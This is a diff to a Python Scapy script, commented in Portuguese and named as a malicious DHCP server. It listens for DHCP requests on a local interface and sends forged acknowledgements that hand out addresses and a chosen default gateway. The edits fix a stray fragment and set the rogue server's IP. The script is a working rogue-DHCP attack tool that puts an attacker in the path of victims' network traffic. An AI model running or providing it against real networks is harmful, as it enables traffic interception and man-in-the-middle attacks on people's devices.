@@ -19,15 +19,16 @@ def malicious_dhcp_server(interface, server_ip, start_ip, end_ip, subnet_mask, r
                        BOOTP(op=2, yiaddr=start_ip, siaddr=server_ip, chaddr=pkt[Ether].src) / \
                        DHCP(options=[("message-type", "ack"), ("subnet_mask", subnet_mask), ("router", router), ("end")])
             sendp(dhcp_ack, iface=interface, verbose=0)
-me r
+
     sniff(filter="udp and (port 67 or 68)", prn=dhcp_server, store=0, iface=interface)
 
 if __name__ == "__main__":
     interface = "eth0"   # Interface de rede a ser usada para o servidor DHCP malicioso
-    server_ip = "192.168.0.6"  # Endereço IP do servidor DHCP malicioso
+    server_ip = "192.168.0.1"  # Endereço IP do servidor DHCP malicioso
     start_ip = "192.168.0.100"  # Primeiro IP a ser oferecido
     end_ip = "192.168.0.200"  # Último IP a ser oferecido
     subnet_mask = "255.255.255.0"  # Máscara de sub-rede
     router = "192.168.0.1"  # Gateway padrão
 
     malicious_dhcp_server(interface, server_ip, start_ip, end_ip, subnet_mask, router)
+
